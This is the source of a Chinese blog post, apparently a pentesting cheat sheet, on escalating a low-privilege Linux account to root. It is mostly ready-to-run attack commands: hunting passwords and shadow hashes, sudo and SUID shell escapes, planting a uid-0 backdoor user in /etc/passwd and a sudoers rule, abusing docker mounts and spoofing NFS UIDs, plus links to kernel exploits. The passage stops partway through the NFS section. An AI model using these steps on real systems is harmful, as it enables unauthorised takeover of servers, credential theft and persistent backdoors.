

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
  <link rel="icon" type="image/png" href="/img/head.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="SE_Null">
  <meta name="keywords" content="">
  <title>linux提权(user-&gt;root) - SE_Null</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/1.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-10-01 16:24" pubdate>
        October 1, 2020 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      8.1k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      107
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">linux提权(user-&gt;root)</h1>
            
            <div class="markdown-body" id="post-body">
              <p>当我们拿到了一台Linux服务器的低权限账号，于是，我们想要通过技术手段提权至 root 用户权限，以执行更多的操作。</p>
<p><strong>Linux提权的前提：</strong></p>
<ul>
<li>拿到了一个低权限的账号</li>
<li>能上传和下载文件</li>
<li>机器上有python、java、perl等环境（非必须项）</li>
</ul>
<h2 id="1-密码相关操作"><a href="#1-密码相关操作" class="headerlink" title="1.密码相关操作"></a>1.密码相关操作</h2><p><strong>1.查找带有密码相关的文件</strong></p>
<p><code>grep --color=auto -rnw &#39;/&#39; -ie  &quot;PASSWORD&quot; --color=always 2&gt; /dev/null</code></p>
<p><strong>2.查看过期的密码</strong></p>
<p><code>cat /etc/security/opasswd</code></p>
<p><code>id</code>：查看权限</p>
<p><strong>3.查看用户最后编辑的文件</strong></p>
<p><code>find / -mmin -10 2&gt;/dev/null |grep -Ev &quot;^/proc&quot;</code></p>
<p><strong>4.查看内存中密码</strong></p>
<p>一些服务的密码可能存在内存中：<code>strings /dev/mem -n10 | grep -i pass</code></p>
<p><strong>5.查找敏感文件</strong></p>
<p>查找带有password的文件：<code>locate password | more</code></p>
<h2 id="2-计划任务cron"><a href="#2-计划任务cron" class="headerlink" title="2.计划任务cron"></a>2.计划任务cron</h2><p>查看计划任务：<code>cat /var/log/cronlog</code></p>
<p>编辑计划任务：<code>/etc/crontab</code></p>
<p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出,默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。</p>
<p><code>ls -l /etc/cron.[d]|[daily]|[hourly]|[monthly]|[weekly]</code></p>
<p>使用该命令，列出的文件，查看这四个文件夹内的文件，查看是否允许其他用户修改。如果允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了。</p>
<h2 id="3-内核漏洞：exp"><a href="#3-内核漏洞：exp" class="headerlink" title="3.内核漏洞：exp"></a>3.内核漏洞：exp</h2><p>查看linux的发行版本</p>
<pre><code class="hljs shell">cat /etc/issue  (Debian，ubuntu系列)
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release (红帽，centos系列)</code></pre>

<p>查看Linux内核版本</p>
<pre><code class="hljs shell">cat /proc/version
uname -a
uname -mrs
rpm -q kernel  （查询kernel rpm包，不推荐用，一个系统可以拥有多个版本包）
dmesg |grep linux
ls /boot |grep vmlinuz</code></pre>

<p><code>dpkg -l</code>：查看已经安装的程序</p>
<p>提权：</p>
<p>1.可以用kali自searchsploit来搜索exploitdb中的漏洞利用代码<code>searchsploit linux Debian 版本</code></p>
<p>2.通过现有的exp上传到目标主机，执行exp，获得shell权限：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits%EF%BC%88%E6%9C%AC%E6%9D%A1%E5%8F%AF%E4%BB%A5%E5%92%8C%E4%B8%8B%E9%9D%A2%E4%B8%80%E6%9D%A1%E7%BB%93%E5%90%88%E4%BD%BF%E7%94%A8%EF%BC%89">https://github.com/SecWiki/linux-kernel-exploits（本条可以和下面一条结合使用）</a></p>
<p>3.工具：linux-exploit-suggester，可以识别当前系统的内核版本以及架构并且尝试查找可以利用的exp</p>
<pre><code class="hljs shell">haha@haha-virtual-machine:~/linux-exploit-suggester-master$ ./linux-exploit-suggester.sh

Available information:

Kernel version: 4.15.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 16.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

74 kernel space exploits
45 user space exploits

Possible Exploits:

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9&#123;libc6:2.24-11+deb9u1&#125;,ubuntu=16.04.3&#123;libc6:2.23-0ubuntu9&#125;
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses &quot;Stack Clash&quot; technique, works against most SUID-root binaries</code></pre>

<p>Linux_Exploit_Suggester同上类似</p>
<p>Linux本地提权漏洞复现与检测思路：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lj3NjQlOeLmoXty5bsA_SA">https://mp.weixin.qq.com/s/lj3NjQlOeLmoXty5bsA_SA</a></p>
<p>其他内核提权</p>
<p><a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p>
<h2 id="4-利用root权限运行的服务提权"><a href="#4-利用root权限运行的服务提权" class="headerlink" title="4.利用root权限运行的服务提权"></a>4.利用root权限运行的服务提权</h2><p>如果特定服务以root用户身份运行，并且我们可以使该服务执行命令，则可以root用户身份执行命令。</p>
<p>可以重点检查Web服务，邮件服务，数据库服务等是否以root用户身份运行。很多时候，运维都以root用户身份运行这些服务，而忽略了它可能引起的安全问题。可能有一些服务在本地运行，而没有公开暴露出来，但是也可以利用。</p>
<p><code>netstat -antup </code>显示所有打开并正在监听的端口。我们可以检查在本地运行的服务是否可以被利用。</p>
<p><code>ps aux </code>列出哪些进程正在运行</p>
<p><code>ps -aux | grep root </code>列出以root身份运行的服务。</p>
<p>例如mysql以root运行，则mysql执行的命令将以root运行，可以参考：<a target="_blank" rel="noopener" href="https://www.jb51.net/article/51767.htm">https://www.jb51.net/article/51767.htm</a></p>
<h2 id="5-sudo提权"><a href="#5-sudo提权" class="headerlink" title="5.sudo提权"></a>5.sudo提权</h2><p>在渗透中，我们拿到的webshell和反弹回来的shell权限可能都不高，如果我们可以使用sudo命令访问某些程序，则我们可以使用<strong>sudo</strong>可以升级特权。</p>
<h3 id="1-sudo基本知识"><a href="#1-sudo基本知识" class="headerlink" title="1.sudo基本知识"></a>1.sudo基本知识</h3><h4 id="1-什么是sudo"><a href="#1-什么是sudo" class="headerlink" title="1.什么是sudo"></a>1.什么是sudo</h4><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p>
<p>它的特性主要有这样几点：</p>
<ul>
<li>sudo能够限制用户只在某台主机上运行某些命令。</li>
<li>sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。</li>
<li>sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。</li>
<li>sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在/etc/sudoers，属性必须为0440。</li>
</ul>
<p>在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。</p>
<p>sudo使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中（通常是/etc/sudoers），即完成对该用户的授权（此时该用户称为“sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在/etc/sudoers自定义），使用sudo不需要再次输入密码。</p>
<p>由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如Ubuntu、Mac OS X等。</p>
<p>参数说明：</p>
<ul>
<li><p>-V 显示版本编号</p>
</li>
<li><p>-h 会显示版本编号及指令的使用方式说明</p>
</li>
<li><p>-l 显示出自己（执行 sudo 的使用者）的权限</p>
</li>
<li><p>-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</p>
</li>
<li><p>-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</p>
</li>
<li><p>-b 将要执行的指令放在背景执行</p>
</li>
<li><p>-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</p>
</li>
<li><p>-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）</p>
</li>
<li><p>-s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell</p>
</li>
<li><p>-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）</p>
</li>
<li><p>command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</p>
</li>
</ul>
<h4 id="2-sudoer文件"><a href="#2-sudoer文件" class="headerlink" title="2.sudoer文件"></a>2.sudoer文件</h4><p><strong>sudoers文件主要有三部分组成：</strong></p>
<ul>
<li>sudoers的默认配置（default），主要设置sudo的一些缺省值</li>
<li>alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。</li>
<li>安全策略（规则定义）——<strong>重点</strong>。</li>
</ul>
<p><strong>语法</strong></p>
<p>root ALL=(ALL) ALL</p>
<p>说明1：root用户可以从  ALL终端作为  ALL（任意）用户执行，并运行  ALL（任意）命令。</p>
<p>第一部分是用户，第二部分是用户可以在其中使用sudo命令的终端，第三部分是他可以充当的用户，最后一部分是他在使用时可以运行的命令。sudo</p>
<p>touhid ALL= /sbin/poweroff</p>
<p>说明2：以上命令，使用户可以从任何终端使用touhid的用户密码关闭命令电源。</p>
<p>touhid ALL = (root) NOPASSWD: /usr/bin/find</p>
<p>说明3：上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。</p>
<h3 id="2-利用sudo来提权"><a href="#2-利用sudo来提权" class="headerlink" title="2.利用sudo来提权"></a>2.利用sudo来提权</h3><h4 id="1-利用服务或者命令来提权"><a href="#1-利用服务或者命令来提权" class="headerlink" title="1.利用服务或者命令来提权"></a>1.利用服务或者命令来提权</h4><p><code>sudo -l</code>：显示当前用户所支持的命令、服务，变相的查询当前的权限</p>
<p><strong>一般滥用sudo命令进行提权的有</strong>：/usr/bin/find、nano、vim、man、awk、less、more、namp、wget</p>
<p>可以参考<a target="_blank" rel="noopener" href="http://evilanne.github.io/2019/07/24/sudo%E6%8F%90%E6%9D%83/">http://evilanne.github.io/2019/07/24/sudo%E6%8F%90%E6%9D%83/</a>     <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1708368">https://cloud.tencent.com/developer/article/1708368</a></p>
<p><strong>一般滥用sudo服务进行提权的有</strong>：msql、apache2</p>
<p><strong>mysql</strong>：<code>sudo mysql -e &#39;\! /bin/sh&#39;</code></p>
<p><strong>apache2</strong>：</p>
<p>使用它我们可以查看系统文件。</p>
<p><code>sudo apache2 -f / etc / shadow</code></p>
<p>输出是这样的：</p>
<p><code>Syntax error on line 1 of /etc/shadow:Invalid command &#39;root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::&#39;, perhaps misspelled or defined by a module not included in the server configuration</code></p>
<p>没有shell，但是我们可以现在提取root哈希，然后再破解哈希。</p>
<h4 id="2-模拟虚拟终端提权"><a href="#2-模拟虚拟终端提权" class="headerlink" title="2.模拟虚拟终端提权"></a>2.模拟虚拟终端提权</h4><p>有了（疑似）root密码怎么办？可ssh登陆。然而ssh很可能禁止root登陆，或是防火墙规则将你排除在外了。可利用低权shell，找个办法在上面“输入”密码就好了。显然，直接在低权shell里面用sudo是不奏效的。这是因为出于安全考虑，linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。</p>
<p>python可，在shell里面输入：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></p>
<pre><code class="hljs shell">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;
<span class="hljs-meta">$</span><span class="bash"> sudo su</span>
sudo su
[sudo] password for www-data: 123456
Sorry, try again.
[sudo] password for www-data:</code></pre>



<h4 id="3-漏洞提权-CVE-2019-14287"><a href="#3-漏洞提权-CVE-2019-14287" class="headerlink" title="3.漏洞提权-CVE-2019-14287"></a>3.漏洞提权-CVE-2019-14287</h4><p>关于此漏洞，有一丢丢鸡肋，因为要修改/etc/sudoers，但是不一定有权限修改此文件。。。可以做一个预留后门，后期使普通账户拥有最高权限。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sstfy/p/11695967.html">https://www.cnblogs.com/sstfy/p/11695967.html</a></p>
<h2 id="6-suid提权"><a href="#6-suid提权" class="headerlink" title="6.suid提权"></a>6.suid提权</h2><p>suid，代表执行时设置的用户id,为文件附上这样的权限命令：chmod u+s 或者 chmod 4755</p>
<p>查看正在系统上运行的所有SUID可执行文件的三条命令（这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。）：</p>
<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>      or</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>            or</p>
<p><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></p>
<p>但并不是具有suid权限的文件均可以用来提权，常见的可以用suid提权:</p>
<p>1.nmap：version(2.02–5.21)带有交互模式，允许用户执行shell命令， 可使用交互式控制台来运行具有相同权限的shell：</p>
<pre><code class="hljs isbl"><span class="hljs-variable">nmap</span> -<span class="hljs-function"><span class="hljs-title">v</span>(查看版本)</span>
<span class="hljs-variable">nmap</span> -<span class="hljs-function"><span class="hljs-title">interactive</span>(启动交互模式)</span>
<span class="hljs-variable">nmap</span>&gt;<span class="hljs-variable">!sh</span>(此命令将会得到一个提权后的<span class="hljs-variable">shell</span>)</code></pre>

<p>vim：<code>vim -c &#39;!sh&#39;</code></p>
<p>另外还有find、bash、more、less、nano、cp等，具体参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/149118.html">https://www.freebuf.com/articles/system/149118.html</a></p>
<p>GTFOBins：一个开源项目，记录了Linux下常见的可用来提权的列表以及如何使用：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%EF%BC%8C%E5%85%B7%E4%BD%93%E4%BD%BF%E7%94%A8%E5%8F%AF%E4%BB%A5%E5%8F%82%E8%80%83%EF%BC%9Ahttps://blog.csdn.net/weixin_44214107/article/details/103537647">https://gtfobins.github.io/，具体使用可以参考：https://blog.csdn.net/weixin_44214107/article/details/103537647</a></p>
<h2 id="7-利用可写文件提权"><a href="#7-利用可写文件提权" class="headerlink" title="7.利用可写文件提权"></a>7.利用可写文件提权</h2><p>大多数linux系统的密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。</p>
<p>有关/etc/passwd 文件里面数据的每个属性，可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/82228791#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF">https://blog.csdn.net/qq_36119192/article/details/82228791#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF</a></p>
<h3 id="1-读取-替换hash"><a href="#1-读取-替换hash" class="headerlink" title="1.读取/替换hash"></a>1.读取/替换hash</h3><p>典型的etc/passwd文件</p>
<pre><code class="hljs elixir"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span>0<span class="hljs-symbol">:</span>0<span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1:1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/bin/sh</span></code></pre>

<p>passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了（这样非root就看不到了）。而shadow里面最重要的就是密码的hash</p>
<p>典型etc/shadow文件</p>
<pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">6</span>$URgq<span class="hljs-number">7</span>sJf$<span class="hljs-number">4</span>x<span class="hljs-number">8</span>e<span class="hljs-number">9</span>ntqTwAPIubi<span class="hljs-number">9</span>YLxLQ<span class="hljs-number">2</span>mZTTZKnGz<span class="hljs-number">0</span>g/wWzOdPB<span class="hljs-number">5</span>eGuz.S<span class="hljs-number">5</span>iRtFdvfFd<span class="hljs-number">9</span>VIVEWouiodB/hh<span class="hljs-number">9</span>BYOLgAD<span class="hljs-number">8</span>u<span class="hljs-number">5</span>/:<span class="hljs-number">16902</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::
<span class="hljs-attribute">daemon</span>:*:<span class="hljs-number">15730</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::</code></pre>

<p>如果passwd可写，我们就可以把root的密码字段(x)替换成一个已知密码的hash（比如本机shadow里面的root密码hash），这样系统在验证密码时以passwd的为准，密码就已知了。如果shadow可读，我们可以读走root的hash，然后用hashcat或者john暴力破解。</p>
<h3 id="2-写入新用户"><a href="#2-写入新用户" class="headerlink" title="2.写入新用户"></a>2.写入新用户</h3><p>管理员设置不规范，导致一些文件可写</p>
<p><code>/etc/passwd</code>可读写，例如写入一个新用户：<code>echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</code>,账户：test，密码：password@123</p>
<p><code>/etc/sudoers</code>可写,例如写一个新用户可用sudo执行任何命令：<code>echo &quot;用户名 ALL=(ALL:ALL)ALL&quot;&gt;&gt;/etc/sudoers</code></p>
<h2 id="8-敏感组提权（docker）"><a href="#8-敏感组提权（docker）" class="headerlink" title="8.敏感组提权（docker）"></a>8.敏感组提权（docker）</h2><p>docker安装之后会有一个docker组，以root权限运行，若权限设置不是很规范，可以利用其搭建一个shell，但是现在docker安装默认权限很低，用处不大~</p>
<p>下面分享一种docker提权方法，看看就行了别当真，前提是已经拥有docker权限的用户unknower(没有就无解~)</p>
<p>远程ssh登录：<code>ssh unknower@target-ip</code></p>
<p>运行以下命令，将目标机的目录(任何你想要的目录)加载到docker镜像来：<code>docker run -v 你想要的目录:/mnt -it alpine </code></p>
<p>​    解释：此命令会到Docker Hub仓库的alpine镜像拉取回来，接着将其运行起来。-v：新建一个磁盘卷给这个docker实例(将目标机你想要的目录映射到docker的/mnt目录)。-it：命令运行后进入交互式界面，而不是让这个实例在后台运行。</p>
<p>咱可以将/etc/passwd 、etc/shadow或者/root/authorized_keys映射金/mnt中，将/etc/passwd中的hash搞出来解个密，但希望不大，准备白干哈哈，还不如自己写一个root用户进去：</p>
<p>openssl指定salt使用MD5加密生成一个密码：<code>openssl passwd -1 -salt test</code></p>
<p>将其写入到passwd中：<code>echo &#39;test:生成的密码:0:0::/root:/bin/bash&#39; &gt;&gt;passwd</code></p>
<p>再使用ssh就可以登录目标机了~</p>
<p>然并卵~</p>
<h2 id="9-劫持环境变量提权"><a href="#9-劫持环境变量提权" class="headerlink" title="9.劫持环境变量提权"></a>9.劫持环境变量提权</h2><p><a target="_blank" rel="noopener" href="https://www.webshell.cc/5211.html">https://www.webshell.cc/5211.html</a></p>
<h2 id="10-网络与隐藏的服务提权"><a href="#10-网络与隐藏的服务提权" class="headerlink" title="10.网络与隐藏的服务提权"></a>10.网络与隐藏的服务提权</h2><p>有一些服务器的服务会被配置成对内网或者对本机开放。通过对他们的攻击我们有机会接触更多的敏感文件，或是运气足够好碰上一个远程root漏洞。</p>
<p><code>netstat -antup</code>可查看各种网络服务</p>
<p>如若找到一些特别的服务，可以nc等做一个端口转发用来提权。</p>
<h2 id="11-通配符注入"><a href="#11-通配符注入" class="headerlink" title="11.通配符注入"></a>11.通配符注入</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/176255.html">https://www.freebuf.com/articles/system/176255.html</a></p>
<h2 id="12-NFS弱权限提权"><a href="#12-NFS弱权限提权" class="headerlink" title="12.NFS弱权限提权"></a>12.NFS弱权限提权</h2><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p>
<h3 id="1-查看目标是否开启nfs服务"><a href="#1-查看目标是否开启nfs服务" class="headerlink" title="1.查看目标是否开启nfs服务"></a>1.查看目标是否开启nfs服务</h3><p>NFS服务的默认开放端口为2049/TCP，可以借助Nmap探测目标主机是否开启nfs服务：<code>nmap -p2049 target-ip</code></p>
<p>也可以通过rpcinfo命令来确定主机上是否运行或挂载了NFS服务：<code>rpcinfo -p target-ip</code></p>
<h3 id="2-列出目标的导出文件夹列表"><a href="#2-列出目标的导出文件夹列表" class="headerlink" title="2.列出目标的导出文件夹列表"></a>2.列出目标的导出文件夹列表</h3><p><strong>showmount</strong></p>
<p>显示出导出文件夹列表：<code>showmount -e target-ip</code></p>
<p>显示指定NFS服务器连接NFS客户端的信息：<code>showmount target-ip </code></p>
<p>显示被挂挂载的共享目录：<code>showmount -d target-ip </code></p>
<p>显示挂载点信息和共享目录：<code>showmount -a target-ip </code></p>
<p><strong>msf</strong></p>
<p>msf也有相应的模块也可列出导出文件夹：<code>auxiliary/scanner/nfs/nfsmount</code></p>
<p><strong>nfsshell</strong></p>
<p>小工具：<a target="_blank" rel="noopener" href="https://github.com/NetDirect/nfsshell">https://github.com/NetDirect/nfsshell</a> 可以连接到NFS共享并可以帮助我们手动识别一些常见的安全问题</p>
<p>安装：</p>
<pre><code class="hljs shell">apt-get install libreadline-dev libncurses5-dev
make
gcc -g -o nfsshell mount_clnt.o mount_xdr.o nfs_prot_clnt.o nfs_prot_xdr.o nfsshell.o -L/usr/local/lib -lreadline -lhistory -lncurses
./nfsshell</code></pre>

<p>获取导出文件夹列表</p>
<pre><code class="hljs shell"><span class="hljs-meta">nfs&gt;</span><span class="bash"> host target-ip // 连接NFS服务</span>
<span class="hljs-meta">nfs&gt;</span><span class="bash"> <span class="hljs-built_in">export</span> // 导出NFS列表</span></code></pre>



<h3 id="3-访问nfs共享文件夹"><a href="#3-访问nfs共享文件夹" class="headerlink" title="3.访问nfs共享文件夹"></a>3.访问nfs共享文件夹</h3><p>导出的文件夹可以通过创建一个空的本地文件夹，并将共享挂载到该文件夹来访问，如下所示：</p>
<pre><code class="hljs shell">root@kali:mkdir /temp/
root@kali:mount -t nfs target-ip:/ /temp -o nolock</code></pre>

<p>当成功验证共享挂载后，列出本地的所有磁盘信息</p>
<pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:df</span> -h</code></pre>

<p>此时，我们可以像访问其他文件夹一样访问共享文件夹。很多企业和组织不止一次的使用不正确的权限配置将everyone’s 的home目录备份到NFS的共享目录下。或许可以发现宝~</p>
<pre><code class="hljs shell">root@kali：cd /temp
root@kali:/temp# ls
...此地就不列出具体信息</code></pre>



<h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h3><pre><code class="hljs shell">root@kali:/temp# ls
password.txt
root@kali:/temp# cat password.txt
cat:password.txt:Permission denied
root@kali:/temp#</code></pre>

<p>对上述文件没有读取权限？可伪造文件所有者的UID欺骗nfs服务器</p>
<p>查看文件所有者的名字和文件所有者的UID（用户ID）和GUID（组ID）:<code>ls -al</code>    <code>id</code></p>
<p>then 在本地创建一个新用户，并将该用户的UID和名称修改为文件所有者相同的</p>
<pre><code class="hljs shell">root@kali:useradd &lt;name&gt;  #创建一个用户
root@kali:passwd &lt;name&gt;  #为该用户设置密码</code></pre>

<p>UID可以在passwd文件中更改：<code>vi /etc/passwd</code></p>
